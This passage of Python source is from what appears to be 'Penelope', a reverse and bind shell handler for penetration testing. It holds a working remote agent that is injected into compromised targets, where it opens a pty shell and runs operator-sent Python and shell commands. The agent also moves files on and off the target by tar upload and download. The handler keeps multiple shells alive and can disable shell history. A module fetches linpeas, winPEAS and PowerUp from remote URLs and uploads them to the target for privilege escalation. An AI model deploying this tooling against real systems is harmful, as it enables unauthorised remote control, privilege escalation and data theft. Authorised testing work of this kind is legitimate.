					f"{paint('(PID: ' + self.tasks[taskid]['pid'] + ')').cyan_DIM}"
				)
				return self.tasks[taskid]
			else:
				logger.warning("Please upgrade the shell first") #TEMP
				return False

		elif self.OS == 'Windows':
			logger.warning("Tasks in Windows shells are not implemented yet")

		return True

	def maintain(self):
		with core.lock:
			current_num = len(core.hosts[self.name])
			if 0 < current_num < options.maintain:
				session = core.hosts[self.name][-1]
				logger.warning(paint(
						f" --- Session {session.id} is trying to maintain {options.maintain} "
						f"active shells on {self.name} ---"
					).blue)
				session.spawn()
				return True
		return False

	def kill(self):

		if self not in core.rlist:
			return True

		thread_name = threading.current_thread().name
		logger.debug(f"Thread <{thread_name}> wants to kill session {self.id}")

		if thread_name != 'Core':
			if self.need_control_sessions and\
				not self.spare_control_sessions and\
				self.control_session is self:
				sessions = ', '.join([str(session.id) for session in self.need_control_sessions])
				if thread_name == 'Menu':
					logger.warning(
						f"Cannot kill Session {self.id} as the following sessions depend on it: {sessions}"
					)
					return False
				else:
					logger.error(f"Sessions {sessions} need a control session.")

			core.control << f'self.sessions[{self.id}].kill()'
			if thread_name == 'Menu':
				menu.kill_wait = queue.Queue()
				logger.error(menu.kill_wait.get())
				del menu.kill_wait

			self.maintain()
			return

		if self.subchannel.active:
			self.subchannel.control << 'kill'

		core.rlist.remove(self)
		del core.sessions[self.id]

		if self in core.wlist:
			core.wlist.remove(self)
		try:
			self.socket.shutdown(socket.SHUT_RDWR)
		except OSError:
			pass

		self.socket.close()

		if not self.OS:
			message = f"Invalid shell from {paint(self.name).white_RED} 🙄\r"
		else:
			message = f"Session [{self.id}] died..."

			if not core.hosts[self.name]:
				message += f" We lost {paint(self.name).white_RED} 💔"

		if hasattr(menu, 'kill_wait'):
			menu.kill_wait.put(message)
		else:
			logger.error(message)

		if hasattr(menu, 'sid') and hasattr(self, 'id') and menu.sid == self.id:
			menu.set_id(None)

		if hasattr(self, 'logfile'):
			self.logfile.close()

		if self.is_attached:
			self.detach()

		return True

class Messenger:
	SHELL = 1
	RESIZE = 2
	UPLOAD = 3
	DOWNLOAD = 4
	PYTHON_EXEC = 5
	SHELL_EXEC = 6
	TASK = 7
	TASK_RESPONSE = 8
	RESPONSE = 9

	LEN_BYTES = 4

	def __init__(self, bufferclass):

		self.len_got = 0
		self.len_bytes = None
		self.len = None

		self.mess_got = 0
		self.mess_last_got = 0

		self.buffer = bufferclass()
		self.message_buf = bufferclass()

	def message(_type, _data):
		_len = len(_data)
		return struct.pack('!IB' + str(_len) + 's', _len + 1, _type, _data)
	message = staticmethod(message)

	def feed(self, data):
		messages = []

		position = self.buffer.tell()
		self.buffer.seek(0, 2) # io.SEEK_END
		self.buffer.write(data)
		self.buffer.seek(position)

		while True:
			if not self.len:
				need = Messenger.LEN_BYTES - self.len_got

				data = self.buffer.read(need)

				if not data:
					break
				self.len_got += len(data)

				if not self.len_bytes:
					self.len_bytes = data
				else:
					self.len_bytes += data

				if self.len_got == Messenger.LEN_BYTES:
					self.len = struct.unpack('!I', self.len_bytes)[0]

			if self.len:
				to_get = self.len - self.mess_got

				data = self.buffer.read(to_get)

				if not data:
					break
				self.mess_last_got = len(data)
				self.mess_got += self.mess_last_got

				self.message_buf.write(data)

				if self.mess_got == self.len:
					self.len_got = 0
					self.len_bytes = None
					self.len = None

					self.mess_got = 0

					self.message_buf.seek(0)
					_type = struct.unpack('!B', self.message_buf.read(1))[0]
					_message = self.message_buf.read()
					self.message_buf.seek(0)
					self.message_buf.truncate(0)

					messages.append((_type, _message))
					#open("/tmp/" + "ppp2", "a").write(repr((_type, _message)) + "\n")

		self.buffer.seek(0)
		self.buffer.truncate(0)

		return messages


def agent():
	import os
	import tty
	import sys
	import pty
	import glob
	import fcntl
	import select
	import struct
	import signal
	import termios
	import tarfile
	import subprocess

	import threading

	SHELL = "{}"
	NET_BUF_SIZE = 8192
	{}
	try:
		import io
		bufferclass = io.BytesIO
	except:
		import StringIO
		bufferclass = StringIO.StringIO

	messenger = Messenger(bufferclass)
	outbuf = bufferclass()
	ttybuf = bufferclass()

	def respond(_type, _value):
		outbuf.seek(0, 2)
		outbuf.write(Messenger.message(_type, _value))
		if not pty.STDOUT_FILENO in wlist:
			wlist.append(pty.STDOUT_FILENO)

	def handle_exceptions(func):
		def inner(*args, **kwargs):
			try:
				func(*args, **kwargs)
			except:
				_, e, _ = sys.exc_info()
				respond(Messenger.RESPONSE, str(-2).encode())
				respond(Messenger.RESPONSE, str(e).encode())
		return inner

	def write_to_pipe(pipe, data):
		os.write(pipe, data)
		os.close(pipe)

	pid, master_fd = pty.fork()
	if pid == pty.CHILD:
		os.execlp(SHELL, "-i") # TEMP # TODO

	try:
		tasks = dict()
		pipes = dict()
		agent.pipe_name = None
		rlist = [master_fd, pty.STDIN_FILENO]
		wlist = []
		for fd in (master_fd, pty.STDIN_FILENO, pty.STDOUT_FILENO):
			flags = fcntl.fcntl(fd, fcntl.F_GETFL)
			fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)

		while True:
			rfds, wfds, xfds = select.select(rlist, wlist, [])

			for readable in rfds:
				if readable is master_fd:
					data = os.read(master_fd, NET_BUF_SIZE)
					if not data:
						raise OSError

					respond(Messenger.SHELL, data)

				elif readable is pty.STDIN_FILENO:
					data = os.read(pty.STDIN_FILENO, NET_BUF_SIZE)
					if not data:
						raise OSError

					messages = messenger.feed(data)
					for _type, _value in messages:
						if _type == Messenger.SHELL:
							ttybuf.seek(0, 2)
							ttybuf.write(_value)
							if not master_fd in wlist:
								wlist.append(master_fd)

						elif _type == Messenger.RESIZE:
							fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)

						elif _type == Messenger.UPLOAD:
							try:
								data = bufferclass(_value)
								tar = tarfile.open(name="", mode='r:gz', fileobj=data)
								tar.errorlevel = 1

								if not agent.pipe_name:
									for item in tar:
										tar.extract(item)
								else:
									pipes[agent.pipe_name.encode()] = os.pipe()
									file = tar.extractfile(tar.members[0])

									firstline = file.readline()[:-1]
									if firstline[:2] == '#!'.encode():
										shebang = firstline[2:]
									else:
										shebang = SHELL.encode()

									file.seek(0)
									data = file.read()
									threading.Thread(
										target=write_to_pipe,
										args=(pipes[agent.pipe_name.encode()][1], data)
										).start()
								tar.close()

							except: #TODO
								_, e, _ = sys.exc_info()
								respond(Messenger.RESPONSE, str(e).encode())
								respond(Messenger.RESPONSE, str(1).encode())
							else:
								respond(Messenger.RESPONSE, "OK".encode())
								respond(Messenger.RESPONSE, str(0).encode())
								if agent.pipe_name:
									respond(Messenger.RESPONSE, shebang)
									agent.pipe_name = None

						elif _type == Messenger.DOWNLOAD:
							try:
								items = glob.glob(os.path.expanduser(_value.decode()))
								if not items:
									raise Exception("No such file or directory: " + _value.decode())

								buffer = bufferclass()
								tar = tarfile.open(name="", mode='w:gz', fileobj=buffer)
								tar.add = handle_exceptions(tar.add)
								for item in items:
									tar.add(item)
								actual_size = sum([item.size for item in tar])
								tar.close()

								data = buffer.getvalue()

							except:
								_, e, _ = sys.exc_info()
								respond(Messenger.RESPONSE, str(-1).encode())
								respond(Messenger.RESPONSE, str(e).encode())
							else:
								respond(Messenger.RESPONSE, str(len(data)).encode())
								respond(Messenger.RESPONSE, str(actual_size).encode())
								respond(Messenger.RESPONSE, data)

						elif _type == Messenger.PYTHON_EXEC:
							result = None
							_locals = locals()
							{}
							result = _locals['result']
							if result:
								respond(Messenger.RESPONSE, str(result).encode())

						elif _type == Messenger.SHELL_EXEC:
							result = os.popen(_value.decode()).read()
							respond(Messenger.RESPONSE, str(result).encode())

						elif _type == Messenger.TASK:
							taskid = _value[:8]
							cmd = _value[8:]
							_stdin = None
							if taskid in pipes:
								_stdin = pipes[taskid][0]
							process = subprocess.Popen(cmd.decode(), shell=True, stdin=_stdin,
								stdout=subprocess.PIPE, stderr=subprocess.PIPE) # TODO stderr
							if _stdin:
								del pipes[taskid]
							out = process.stdout.fileno()
							err = process.stderr.fileno()
							rlist.extend([out, err])
							tasks[out] = taskid + "1".encode()
							tasks[err] = taskid + "2".encode()
							respond(Messenger.RESPONSE, str(process.pid).encode())

				elif readable in tasks:
					data = os.read(readable, NET_BUF_SIZE)
					respond(Messenger.TASK_RESPONSE, tasks[readable] + data)
					if not data:
						rlist.remove(readable)
						del tasks[readable]

			for writable in wfds:
				if writable is pty.STDOUT_FILENO:
					sendbuf = outbuf
				elif writable is master_fd:
					sendbuf = ttybuf

				try:
					sent = os.write(writable, sendbuf.getvalue())
				except OSError:
					break

				sendbuf.seek(sent)
				remaining = sendbuf.read()
				sendbuf.seek(0)
				sendbuf.truncate()
				sendbuf.write(remaining)
				if not remaining:
					wlist.remove(writable)

	except:
		_, e, t = sys.exc_info()
		import traceback
		traceback.print_exc()
		traceback.print_stack()

	os.close(master_fd)
	os.waitpid(pid, 0)[1]

	os.kill(os.getppid(), signal.SIGKILL) # TODO


################################## GENERAL PURPOSE CUSTOM CODE ####################################

caller = lambda: inspect.stack()[2].function
rand = lambda _len: ''.join(random.choice(string.ascii_letters) for i in range(_len))
bdebug = lambda file, data: open("/tmp/" + file, "a").write(repr(data) + "\n")
chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
pathlink = lambda filepath: (
	f'\x1b]8;;file://{filepath.parents[0]}\x07{filepath.parents[0]}'
	f'/\x1b]8;;\x07\x1b]8;;file://{filepath}\x07{filepath.name}\x1b]8;;\x07'
)

def Open(item, terminal=False):
	if OS == 'Linux' and not DISPLAY:
		logger.error("No available $DISPLAY")
		return False

	if not terminal:
		program = {'Linux':'xdg-open', 'Darwin':'open'}[OS]
		args = [item]
	else:
		program = {'Linux':'x-terminal-emulator', 'Darwin':'osascript'}[OS]
		if OS == 'Linux':
			args = ['-e', *shlex.split(item)]
		elif OS == 'Darwin':
			args = ['-e', f'tell app "Terminal" to do script "{item}"']

	if not shutil.which(program):
		logger.error(f"Cannot open window: '{program}' binary does not exist")
		return False

	process = subprocess.Popen(
		(program, *args),
		stdin=subprocess.DEVNULL,
		stdout=subprocess.DEVNULL,
		stderr=subprocess.PIPE
	)
	r, _, _ = select.select([process.stderr], [], [], .01)
	if process.stderr in r:
		error = os.read(process.stderr.fileno(), 1024)
		if error:
			logger.error(error.decode())
			return False

	return True

def ask(text):
	try:
		return input(f"\r{paint(f'[?] {text}: ').yellow}")

	except EOFError:
		return ask(text)

class Interfaces:

	def __str__(self):
		table = Table(joinchar=' : ')
		table.header = [paint('Interface').MAGENTA, paint('IP Address').MAGENTA]
		for name, ip in self.list.items():
			table += [paint(name).cyan, paint(ip).yellow]
		return str(table)

	def oneLine(self):
		return '(' + str(self).replace('\n', '|') + ')'

	def translate(self, iface_ip):
		if iface_ip in self.list:
			return self.list[iface_ip]
		elif iface_ip == 'any':
			return '0.0.0.0'
		else:
			return iface_ip

	@property
	def list(self):
		if OS == 'Linux':
			if shutil.which("ip"):
				output = subprocess.check_output(['ip', 'a']).decode()
				interfaces = re.findall(r'(?m)(?<=^ {4}inet )([^ /]*).* ([^ ]*)$', output)
				return {i[1]:i[0] for i in interfaces}
			else:
				logger.error("'ip' command is not available")
				return dict()

		elif OS == 'Darwin':
			_list = dict()
			if shutil.which("ifconfig"):
				output = re.sub('\n\s', ' ', subprocess.check_output(['ifconfig']).decode())
				for line in output.splitlines():
					result = re.search('^([^:]*).*inet ([^ ]*)', line)
					if result:
						_list[result[1]] = result[2]
			else:
				logger.error("'ifconfig' command is not available")
			return _list

	@property
	def list_all(self):
		return [item for item in list(self.list.keys())+list(self.list.values())]

class Table:

	def __init__(self, list_of_lists=[], header=None, fillchar=" ", joinchar=" "):
		self.list_of_lists = list_of_lists

		self.joinchar = joinchar

		if type(fillchar) is str:
			self.fillchar = [fillchar]
		elif type(fillchar) is list:
			self.fillchar = fillchar
#		self.fillchar[0] = self.fillchar[0][0]

		self.data = []
		self.max_row_len = 0
		self.col_max_lens = []
		if header: self.header = header
		for row in self.list_of_lists:
			self += row

	@property
	def header(self):
		...

	@header.setter
	def header(self, header):
		self.add_row(header, header=True)

	def __str__(self):
		self.fill()
		return "\n".join([self.joinchar.join(row) for row in self.data])

	def __len__(self):
		return len(self.data)

	def add_row(self, row, header=False):
		row_len = len(row)
		if row_len > self.max_row_len:
			self.max_row_len = row_len

		cur_col_len = len(self.col_max_lens)
		for _ in range(row_len - cur_col_len):
			self.col_max_lens.append(0)

		for _ in range(cur_col_len - row_len):
			row.append("")

		new_row = []
		for index, element in enumerate(row):
			if not isinstance(element, (str, paint)):
				element = str(element)
			elem_length = len(element)
			new_row.append(element)
			if elem_length > self.col_max_lens[index]:
				self.col_max_lens[index] = elem_length

		if header:
			self.data.insert(0, new_row)
		else:
			self.data.append(new_row)

	def __iadd__(self, row):
		self.add_row(row)
		return self

	def fill(self):
		for row in self.data:
			for index, element in enumerate(row):
				fillchar = ' '
				if index in [*self.fillchar][1:]:
					fillchar = self.fillchar[0]

				row[index] = element + fillchar * (self.col_max_lens[index] - len(element))


class PBar:
	pbars = []

	def __init__(self, end, caption="", max_width=None):
		self.pos = 0
		self.end = end # end > 0 # TODO
		self.active = True
		self.caption = caption
		self.max_width = max_width
		__class__.pbars.append(self)

	@property
	def percent(self):
		return int(self.pos * 100 / self.end)

	def update(self, step=1):
		self.pos += step
		if self.pos > self.end:
			self.pos = self.end
		if self.active:
			self.render()

	def render(self):
		percent = self.percent
		self.active = False if percent == 100 else True
		cursor = "\x1b[?25l" if self.active else "\x1b[?25h" # __exit__ TODO
		left = f"{self.caption} ["
		right = f"] {str(percent).rjust(3)}%"
		up = f"\x1b[A" if self.active else ""
		bar_space = self.max_width if self.max_width else os.get_terminal_size().columns - len(left) - len(right)
		bars = int(percent * bar_space / 100) * "#"
		print(f'{cursor}{left}{bars.ljust(bar_space, ".")}{right}{up}')

	def terminate(self):
		print("\x1b[?25h")

class paint:
	_codes = {'RESET':0, 'BRIGHT':1, 'DIM':2, 'UNDERLINE':4, 'BLINK':5, 'NORMAL':22}
	_colors = {'black':0, 'red':1, 'green':2, 'yellow':3, 'blue':4, 'magenta':5, 'cyan':6, 'white':7, 'orange':136}
	_escape = lambda codes: f"\x1b[{codes}m"

	def __init__(self, text=None, colors=None):
		self.text = str(text) if text is not None else None
		self.colors = colors if colors is not None else []

	def __str__(self):
		if self.colors:
			content = self.text + __class__._escape(__class__._codes['RESET']) if self.text is not None else ''
			return __class__._escape(';'.join(self.colors)) + content
		return self.text

	def __len__(self):
		return len(self.text)

	def __add__(self, text):
		return str(self) + str(text)

	def __mul__(self, num):
		return __class__(self.text * num, self.colors)

	def __getattr__(self, attr):
		self.colors.clear()
		for color in attr.split('_'):
			if color in __class__._codes:
				self.colors.append(str(__class__._codes[color]))
			else:
				prefix = "3" if color in __class__._colors else "4"
				self.colors.append(prefix + "8;5;" + str(__class__._colors[color.lower()]))
		return self

class CustomFormatter(logging.Formatter):
	TEMPLATES = {
		logging.CRITICAL:	{'color':"RED",		'prefix':"[!!!]"},
		logging.ERROR:		{'color':"red",		'prefix':"[-]"},
		logging.WARNING:	{'color':"yellow",	'prefix':"[!]"},
		logging.INFO:		{'color':"green",	'prefix':"[+]"},
		logging.DEBUG:		{'color':"magenta",	'prefix':"[---DEBUG---]"}
	}
	def format(self, record):
		template = __class__.TEMPLATES[record.levelno]
		prefix = "\r" if core.attached_session is None else ""
		suffix = "\r" if core.attached_session is not None else ""
		thread = paint(" ") + paint(threading.current_thread().name).white_CYAN\
			if record.levelno is logging.DEBUG or options.debug else ""
		text = prefix + f"{template['prefix']}{thread} {logging.Formatter.format(self, record)}" + suffix
		return str(getattr(paint(text), template['color']))

##########################################################################################################

def ControlC(num, stack):
	if core.attached_session:
		core.attached_session.detach()

	elif "Menu" in core.threads:
		#os.write(sys.stdout.fileno(), b'^C\n')
		#os.write(sys.stdout.fileno(), menu.prompt.encode())
		if menu.sid:
			core.sessions[menu.sid].subchannel.control << 'stop'

	elif not core.sessions:
		core.stop()

def WinResize(num, stack):
	if core.attached_session is not None and core.attached_session.type == "PTY":
		threading.Thread(target=core.attached_session.update_pty_size, name="RESIZE").start()

# CONSTANTS
OS = platform.system()
OSes = {'Unix':'🐧', 'Windows':'💻'}
TTY_NORMAL = termios.tcgetattr(sys.stdin)
DISPLAY = 'DISPLAY' in os.environ
NET_BUF_SIZE = 8192
LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
MESSENGER = inspect.getsource(Messenger)
AGENT = inspect.getsource(agent)
BINARIES = {
	'socat': "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat",
	'ncat': "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat",
	'linpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
	'winpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat",
	'lse': "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
	'powerup': "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1"
}


# INITIALIZATION
signal.signal(signal.SIGINT, ControlC)
signal.signal(signal.SIGWINCH, WinResize)

## CREATE BASIC OBJECTS
core = Core()
menu = MainMenu()

# OPTIONS
class Options:
	log_levels = {"silent":'WARNING', "debug":'DEBUG'}

	def __init__(self):
		self.port = 4444
		self.interface = "0.0.0.0"
		self.latency = .01
		self.histlength = 1000
		self.long_timeout = 60
		self.short_timeout = 5
		self.max_maintain = 10
		self.maintain = 1
		self.max_open_files = 5
		self.verify_ssl_cert = True
		self.proxy = ''
		self.upload_chunk_size = 51200
		self.download_chunk_size = 1048576
		self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
		self.basedir = Path.home() / f'.{__program__}'
		self.logfile = f"{__program__}.log"
		self.debug_logfile = "debug.log"
		self.cmd_histfile = 'cmd_history'
		self.debug_histfile = 'cmd_debug_history'
		self.useragent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
		self.modules = {
			'upload_privesc_scripts':{
				'description':'Upload privilege escalation scripts to the target',
				'actions':{
					'Unix':[
						f"upload {BINARIES['linpeas']}",
						f"upload {BINARIES['lse']}"
					],
					'Windows':[
						f"upload {BINARIES['powerup']}"
					]
				}
			},
			'peass-ng':{
				'description':'Run the latest version of PEASS-ng in the background',
				'actions':{
					'Unix':[
						f"task {BINARIES['linpeas']}"
					],
					'Windows':[
						f"task {BINARIES['winpeas']}"
					]
				}
			}
		}
		self.configfile = self.basedir / 'penelope.conf'

	def __getattribute__(self, option):
		if option in ("logfile", "debug_logfile", "cmd_histfile", "debug_histfile"):
			return self.basedir / super().__getattribute__(option)
#		if option == "basedir":
#			return Path(super().__getattribute__(option))
		return super().__getattribute__(option)

	def __setattr__(self, option, value):
		show = logger.error if 'logger' in globals() else lambda x: print(paint(x).red)
		level = __class__.log_levels.get(option)

		if level:
			level = level if value else 'INFO'
			logging.getLogger(__program__).setLevel(getattr(logging, level))

		elif option == 'maintain':
			if value > self.max_maintain:
				show(f"Maintain value decreased to the max ({self.max_maintain})")
				value = self.max_maintain
			if value < 1: value = 1
			#if value == 1: show(f"Maintain value should be 2 or above")
			if value > 1 and self.single_session:
				show(f"Single Session mode disabled because Maintain is enabled")
				self.single_session = False

		elif option == 'single_session':
			if self.maintain > 1 and value:
				show(f"Single Session mode disabled because Maintain is enabled")
				value = False

		elif option == 'no_bins':
			if value is None:
				value = []
			elif type(value) is str:
				value = re.split('[^a-zA-Z0-9]+', value)

		elif option == 'proxy':
			if not value:
				os.environ.pop('http_proxy', '')
				os.environ.pop('https_proxy', '')
			else:
				os.environ['http_proxy'] = value
				os.environ['https_proxy'] = value

		elif option == 'configfile':
			self.__dict__[option] = value
			config = ConfigParser(interpolation=None)
			config.read(str(self.configfile))
			if "options" in config.sections():
				for _option, _value in config['options'].items():
					setattr(self, _option, eval(_value))

		elif option == 'basedir':
			value.mkdir(parents=True, exist_ok=True)

		if hasattr(self, option) and getattr(self, option) is not None:
			new_value_type = type(value).__name__
			orig_value_type = type(getattr(self, option)).__name__
			if new_value_type == orig_value_type:
				self.__dict__[option] = value
			else:
				show(f"Wrong value type for '{option}': Expect <{orig_value_type}>, not <{new_value_type}>")
		else:
			self.__dict__[option] = value

## DEFAULT OPTIONS
options = Options()

## COMMAND LINE OPTIONS
parser = argparse.ArgumentParser(description="Penelope Shell Handler", add_help=False)

parser.add_argument("ports", nargs='*', help="Ports to listen/connect to, depending on -i/-c options. Default: 4444")

method = parser.add_argument_group("Reverse or Bind shell?")
method.add_argument("-i", "--interface", help="Interface or IP address to listen on. Default: 0.0.0.0", metavar='')
method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')

hints = parser.add_argument_group("Hints")
hints.add_argument("-a", "--hints", help="Show sample payloads for reverse shell based on the registered Listeners", action="store_true")
hints.add_argument("-l", "--interfaces", help="Show the available network interfaces", action="store_true")
hints.add_argument("-h", "--help", action="help", help="show this help message and exit")

verbosity = parser.add_argument_group("Verbosity")
verbosity.add_argument("-Q", "--silent", help="Be a bit less verbose", action="store_true")
verbosity.add_argument("-d", "--debug", help="Show debug messages", action="store_true")

log = parser.add_argument_group("Session Logging")
log.add_argument("-L", "--no-log", help="Do not create session log files", action="store_true")
log.add_argument("-T", "--no-timestamps", help="Do not include timestamps in session logs", action="store_true")

misc = parser.add_argument_group("Misc")
misc.add_argument("-r", "--configfile", help="Configuration file location", type=Path, metavar='')
misc.add_argument("-m", "--maintain", help="Maintain NUM total shells per target", type=int, metavar='')
misc.add_argument("-H", "--no-history", help="Disable shell history on target", action="store_true")
misc.add_argument("-P", "--plain", help="Just land to the main menu", action="store_true")
misc.add_argument("-S", "--single-session", help="Accommodate only the first created session", action="store_true")
misc.add_argument("-C", "--no-attach", help="Disable auto attaching sessions upon creation", action="store_true")
misc.add_argument("-U", "--no-upgrade", help="Do not upgrade shells", action="store_true")

debug = parser.add_argument_group("Debug")
debug.add_argument("-N", "--no-bins", help="Simulate binary absence on target (comma separated list)", metavar='')
debug.add_argument("-v", "--version", help="Show Penelope version", action="store_true")

args = [] if not __name__ == "__main__" else None
parser.parse_args(args, options)

## LOGGERS
stdout_handler = logging.StreamHandler()
stdout_handler.setFormatter(CustomFormatter())

file_handler = logging.FileHandler(options.logfile)
file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
file_handler.setLevel('INFO') # ??? TODO

debug_file_handler = logging.FileHandler(options.debug_logfile)
debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
debug_file_handler.addFilter(lambda record: True if record.levelno == logging.DEBUG else False)

logger = logging.getLogger(__program__)
logger.addHandler(stdout_handler)
logger.addHandler(file_handler)
logger.addHandler(debug_file_handler)

cmdlogger = logging.getLogger(f"{__program__}_cmd")
cmdlogger.setLevel(logging.INFO)
cmdlogger.addHandler(stdout_handler)

DEV_MODE = False
if DEV_MODE:
	stdout_handler.addFilter(lambda record: True if record.levelno != logging.DEBUG else False)
	logger.setLevel('DEBUG')
	options.max_maintain = 50
	options.no_bins = 'python,python3,script'

def listener_menu():
	if not core.listeners:
		return False

	listener_menu.active = True
	func = None
	listener_menu.control_r, listener_menu.control_w = os.pipe()

	listener_menu.finishing = threading.Event()

	tty.setraw(sys.stdin)
	while True:
		sys.stdout.write(
			f"\x1b[?25l{paint('➤ ').white} "
			f"💀 {paint('Show Payloads').magenta} (p) "
			f"🏠 {paint('Main Menu').green} (m) "
			f"🔄 {paint('Clear').yellow} (Ctrl-L) "
			f"🚫 {paint('Quit').red} (q/Ctrl-C)\r\n"
		)
		sys.stdout.flush()

		r, _, _ = select.select([sys.stdin, listener_menu.control_r], [], [])
		if sys.stdin in r:
			command = sys.stdin.read(1).lower()
			if command == 'p':
				for listener in core.listeners.values():
					sys.stdout.write(f"\r\n{listener.hints}\r\n")
			elif command == 'm':
				func = menu.show
				break
			elif command == '\x0C':
				os.system("clear")
			elif command in ('q', '\x03'):
				func = core.stop
				break
			sys.stdout.write('\x1b[1A')
			continue
		break

	termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
	sys.stdout.write("\x1b[?25h")
	sys.stdout.flush()
	if func: func()

	os.close(listener_menu.control_r)
	listener_menu.active = False
	listener_menu.finishing.set()
	return True

def main():

	# Version
	if options.version:
		print(__version__)
		return

	# Interfaces
	elif options.interfaces:
		print(Interfaces())
		return

	# Main Menu
	elif options.plain:
		menu.show()
		return

	if not options.ports:
		options.ports.append(options.port)

	for port in options.ports:
		# Bind shell
		if options.connect:
			Connect(options.connect, port)
		# Reverse Listener
		else:
			Listener(port=port)

	listener_menu()

if __name__ == "__main__":
	main()
